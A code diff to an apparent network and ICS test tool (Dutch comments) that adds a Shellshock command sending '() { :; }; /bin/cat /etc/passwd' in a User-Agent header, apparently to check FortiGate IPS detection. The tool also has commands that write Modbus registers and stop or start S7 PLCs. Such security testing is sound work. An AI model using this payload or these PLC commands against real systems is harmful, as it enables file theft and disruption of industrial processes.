@@ -6,6 +6,7 @@ Elk commando print als laatste regel één JSON-object: {"ok": bool, "detail": .
   scan <target> <ports>             TCP connect-scan (nmap)
   tcp <ip> <port>                   TCP-verbinding opzetten
   http <url>                        HTTP GET
+  shellshock <url>                  HTTP GET met een Shellshock-payload (CVE-2014-6271)
   modbus-read <ip> <addr> <count>   holding registers lezen
   modbus-write <ip> <addr> <value>  holding register schrijven
   s7-read <ip>                      CPU-status + DB1 lezen
@@ -16,6 +17,7 @@ import json
 import socket
 import subprocess
 import sys
+import urllib.error
 import urllib.request
 
 
@@ -53,6 +55,19 @@ def cmd_http(url):
     try:
         with urllib.request.urlopen(url, timeout=6) as r:
             out(True, f"HTTP {r.status}, {len(r.read())} bytes")
+    except Exception as e:  # noqa: BLE001
+        out(False, str(e))
+
+
+def cmd_shellshock(url):
+    # Klassieke Shellshock-payload in een header; een kwetsbare CGI-server zou
+    # het commando uitvoeren. De FortiGate-IPS herkent het patroon.
+    req = urllib.request.Request(url, headers={"User-Agent": "() { :; }; /bin/cat /etc/passwd"})
+    try:
+        with urllib.request.urlopen(req, timeout=6) as r:
+            out(True, f"HTTP {r.status}: payload kwam aan bij de server")
+    except urllib.error.HTTPError as e:
+        out(True, f"HTTP {e.code}: payload kwam aan bij de server")
     except Exception as e:  # noqa: BLE001
         out(False, str(e))
 
@@ -144,7 +159,7 @@ def cmd_opcua_browse(url):
 
 
 COMMANDS = {
-    "scan": cmd_scan, "tcp": cmd_tcp, "http": cmd_http,
+    "scan": cmd_scan, "tcp": cmd_tcp, "http": cmd_http, "shellshock": cmd_shellshock,
     "modbus-read": cmd_modbus_read, "modbus-write": cmd_modbus_write,
     "s7-read": cmd_s7_read, "s7-stop": cmd_s7_stop, "s7-start": cmd_s7_start,
     "opcua-browse": cmd_opcua_browse,
